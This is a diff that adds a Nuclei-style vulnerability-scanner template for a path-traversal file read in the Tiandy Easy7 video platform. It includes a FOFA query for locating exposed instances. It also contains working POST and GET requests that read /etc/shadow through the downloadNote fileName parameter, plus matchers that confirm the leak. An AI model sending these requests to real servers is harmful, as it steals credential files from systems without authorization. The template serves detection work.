@@ -1,0 +1,47 @@
+id: TianDiWeiYe-Easy7-downloadNote-File-Reading
+
+info:
+  name: 天地伟业 Easy7 /Easy7/rest/file/downloadNote 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
+    天地伟业 Easy7 平台 /Easy7/rest/file/downloadNote 接口存在任意文件读取漏洞。攻击者可通过构造恶意POST请求，利用 fileName 参数进行目录遍历，读取服务器上的任意文件，包括系统敏感文件如 /etc/shadow 等。成功利用此漏洞可能导致服务器敏感信息泄露，对系统安全构成严重威胁。
+  reference:
+    - 
+  tags: file-reading, tiandiweiye, easy7
+
+http:
+    # 第一个请求：检测 POST 接口
+  - raw:
+      - |-
+        POST /Easy7/rest/file/downloadNote HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Connection: keep-alive
+
+        fileName=../../../../../../../../../etc/shadow&fullName=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains_all(body, 'root:', 'bin:', 'daemon:')"
+        condition: and
+        name: 任意文件读取-POST接口
+
+# 第二个请求：检测 GET 接口
+  - raw:
+      - |-
+        GET /Easy7/rest/file/downloadNote?fileName=../../../../../../../../../etc/shadow&fullName=cpuinfo HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains_all(body, 'root:', 'bin:', 'daemon:')"
+        condition: and
+        name: 任意文件读取-GET接口
